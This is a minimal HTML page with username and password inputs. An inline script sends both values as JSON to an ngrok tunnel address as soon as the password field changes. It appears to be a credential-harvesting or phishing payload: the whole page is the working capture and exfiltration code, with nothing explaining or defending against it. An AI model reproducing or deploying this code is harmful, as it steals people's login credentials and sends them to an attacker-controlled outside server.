<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>

</head>
<body>
<input type="username" id="usernamee" name="username">
<input type="password" id="passwordd" name="password" onchange="postCredentials()">
<script>
  function postCredentials () {
    var request = new XMLHttpRequest();
    request.open('POST', 'https://5d06-2800-a4-29a5-2a00-c982-74de-a4ef-da4.ngrok.io/');
    request.setRequestHeader('Content-Type', 'application/json');
    request.send(JSON.stringify({
      username: document.getElementById('usernamee').value,
      password: document.getElementById('passwordd').value
    }));
  }
</script>

</body>
</html>
